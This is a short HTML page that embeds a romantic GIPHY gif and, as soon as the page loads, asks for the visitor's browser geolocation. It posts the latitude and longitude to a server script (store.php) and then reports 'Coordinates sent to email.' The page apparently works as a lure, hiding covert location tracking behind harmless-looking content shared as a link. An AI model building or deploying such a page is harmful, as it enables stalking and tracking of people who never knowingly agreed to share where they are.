<!DOCTYPE html>
<html>
<body onload="getLocation()">

<iframe src="https://giphy.com/embed/BUfpfjQwtrMXDKVSF6" width="320" height="480" style="" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/ZhotShop-love-amor-couple-BUfpfjQwtrMXDKVSF6">via GIPHY</a></p>

<p id="demo"></p>

<script>
const x = document.getElementById("demo");

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else { 
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}

function showPosition(position) {
    const xhttp = new XMLHttpRequest();
    xhttp.open("POST", "store.php", true);
    xhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhttp.onreadystatechange = function() {
        if (xhttp.readyState === 4 && xhttp.status === 200) {
            alert("Coordinates sent to email.");
        }
    };
    xhttp.send("lat=" + position.coords.latitude + "&long=" + position.coords.longitude);
}
</script>

</body>
</html>
